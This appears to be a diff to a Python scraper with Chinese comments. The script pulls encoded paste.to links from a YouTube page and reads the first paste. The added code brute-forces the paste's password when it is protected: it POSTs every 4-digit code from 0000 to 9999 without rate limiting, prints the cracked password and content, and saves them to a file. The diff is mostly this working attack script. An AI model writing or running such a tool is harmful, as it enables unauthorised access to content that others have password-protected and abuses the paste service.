@@ -2,6 +2,8 @@ import requests
 import re
 from datetime import datetime
 from urllib.parse import urljoin, unquote
+from itertools import product
+import time
 
 def get_youtube_content(url):
     """获取YouTube页面内容"""
@@ -17,19 +19,66 @@ def get_youtube_content(url):
         print(f"获取内容失败: {str(e)}")
         return None
 
-def get_paste_content(url):
+def get_paste_content(url, password=None):
     """获取paste.to页面内容"""
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
         'Accept-Language': 'zh-CN,zh;q=0.9'
     }
+    
     try:
-        response = requests.get(url, headers=headers, timeout=15)
+        if password:
+            # 如果有密码，使用POST方法提交密码
+            data = {'password': password}
+            response = requests.post(url, headers=headers, data=data, timeout=15)
+        else:
+            # 如果没有密码，直接GET访问
+            response = requests.get(url, headers=headers, timeout=15)
+        
         response.raise_for_status()
+        
+        # 检查页面是否返回密码输入表单
+        if 'password-protected' in response.text.lower():
+            return None  # 需要密码
         return response.text
     except Exception as e:
         print(f"获取paste.to内容失败: {str(e)}")
         return None
+
+def brute_force_paste(url):
+    """暴力破解4位数字密码"""
+    print(f"\n开始暴力破解paste.to链接: {url}")
+    print("密码规则: 4位数字(0000-9999)")
+    
+    # 生成所有可能的4位数字组合
+    digits = '0123456789'
+    total = len(digits) ** 4
+    attempts = 0
+    start_time = time.time()
+    
+    for combo in product(digits, repeat=4):
+        password = ''.join(combo)
+        attempts += 1
+        
+        # 每尝试100次打印一次进度
+        if attempts % 100 == 0:
+            elapsed = time.time() - start_time
+            print(f"尝试进度: {attempts}/{total} ({(attempts/total)*100:.1f}%), 已用时: {elapsed:.1f}秒, 当前尝试: {password}")
+        
+        content = get_paste_content(url, password)
+        
+        if content is not None:
+            elapsed = time.time() - start_time
+            print(f"\n破解成功! 密码: {password}")
+            print(f"总尝试次数: {attempts}, 总用时: {elapsed:.1f}秒")
+            print("\n获取到的内容:")
+            print("-" * 50)
+            print(content)
+            print("-" * 50)
+            return password, content
+    
+    print("\n暴力破解完成，未找到正确密码")
+    return None, None
 
 def find_latest_video(channel_url):
     """查找最新日期的视频"""
@@ -67,9 +116,6 @@ def find_latest_video(channel_url):
 def extract_encoded_paste_links(content):
     """
     精确查找编码后的paste.to链接
-    搜索方法：
-    1. 查找"https%3A%2F%2Fpaste.to"字符串
-    2. 从该位置开始提取，直到遇到反斜杠或空格
     """
     print("正在搜索编码后的paste.to链接...")
     links = []
@@ -118,15 +164,27 @@ def main():
         # 访问第一个找到的paste.to链接
         first_paste_link = paste_links[0]
         print(f"\n正在访问第一个paste.to链接: {first_paste_link}")
+        
+        # 首先尝试无密码访问
         paste_content = get_paste_content(first_paste_link)
         
         if paste_content:
-            print("\npaste.to页面内容:")
+            print("\npaste.to页面内容(无密码):")
             print("-" * 50)
             print(paste_content)
             print("-" * 50)
         else:
-            print("\n无法获取paste.to页面内容")
+            print("\n该paste.to内容受密码保护，开始暴力破解...")
+            password, content = brute_force_paste(first_paste_link)
+            
+            if password:
+                # 保存结果到文件
+                with open('paste_result.txt', 'w', encoding='utf-8') as f:
+                    f.write(f"URL: {first_paste_link}\n")
+                    f.write(f"Password: {password}\n")
+                    f.write("Content:\n")
+                    f.write(content)
+                print("\n结果已保存到 paste_result.txt")
     else:
         print("\n未找到paste.to链接")
 
